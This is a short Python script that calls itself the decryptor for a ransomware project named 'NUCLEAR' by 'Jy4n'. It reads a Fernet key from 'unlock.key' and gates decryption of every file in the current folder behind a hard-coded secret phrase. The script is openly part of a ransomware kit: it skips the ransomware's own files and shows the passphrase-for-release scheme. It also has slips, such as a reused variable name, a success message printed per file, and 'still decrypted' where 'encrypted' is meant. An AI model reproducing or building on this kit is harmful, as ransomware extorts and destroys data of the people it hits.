#!/usr/bin/env python3
# Decryptor for the ransomware


import os
from cryptography.fernet import Fernet

# Find some files

def banner():
	print("+-----------------+")
	print("|---- NUCLEAR ----|")
	print("|  -- By Jy4n --  |")
	print("+-----------------+")

def clear_screen():
	os.system("clear")

files = []
def decrypt_files():
	files = []
	for file in os.listdir():
		if file == "ransomware.py" or file == "unlock.key" or file == "decryptor.py" or file == "main.py":
			continue
		if os.path.isfile(file):
			files.append(file)

	with open("unlock.key", "rb") as key:
		secretkey = key.read()

	secretphrase = "Jy4n"
	user_phrase = input("Enter the secret phrase to decrypt your files: ")

	if user_phrase == secretphrase:
		clear_screen()
		banner()
		for file in files:
			with open(file, "rb") as files:
				contents = files.read()
			contents_decrypted = Fernet(secretkey).decrypt(contents)
			with open(file, "wb") as files:
				files.write(contents_decrypted)
			print("Your files are decrypted!!")
	else:
			print("Sorry wrong phrase, your files are still decrypted...")
